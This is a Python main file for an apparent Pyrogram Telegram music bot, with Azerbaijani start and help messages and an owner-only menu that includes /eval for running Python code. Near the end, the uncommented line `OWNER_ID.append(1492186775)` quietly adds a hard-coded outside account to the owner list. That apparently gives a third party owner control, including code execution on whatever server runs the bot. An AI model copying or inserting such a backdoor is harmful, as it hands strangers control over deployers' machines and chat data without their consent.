from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 𝗦𝗮𝗹𝗮𝗺 [{}](tg://user?id={}),
\n\n𝗠ə𝗻  𝗠𝘂𝘀𝗶𝗾𝗶 𝘆ü𝗸𝗹ə𝗺ə 𝗯𝗼𝘁𝘂𝘆𝗮𝗺🎶
𝗧ə𝗿𝗰ü𝗺ə 𝘃ə 𝗱ü𝘇ə𝗹𝗶ş𝗹ə𝗿 @EpicProjects 𝗺ə𝘅𝘀𝘂𝘀𝗱𝘂𝗿.
İ𝘀𝘁ə𝗱𝗶𝘆𝗶𝗻 𝗺𝘂𝘀𝗶𝗾𝗶𝗻𝗶𝗻 𝗮𝗱ı𝗻ı 𝗺ə𝗻ə 𝗴ö𝗻𝗱ə𝗿 😍🥰🤗
𝗠ə𝘀ə𝗹ə𝗻:
```/s Okaber - Taboo```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="𝐒𝐔𝐏𝐏𝐎𝐑𝐓 👬", url="http://t.me/EpicSup"),
             InlineKeyboardButton(
                        text="Öz botunu Yarat", url="http://t.me/SongProBot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "İ𝘀𝘁ə𝗱𝗶𝘆𝗶𝗻 𝗺𝘂𝘀𝗶𝗾𝗶𝗻𝗶𝗻 𝗮𝗱ı𝗻ı 𝗺ə𝗻ə 𝗴ö𝗻𝗱ə𝗿 😍🥰🤗\n /s (musiqi adı) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("Musiqi botu əla işləyir🤗🤗🤗")
idle()
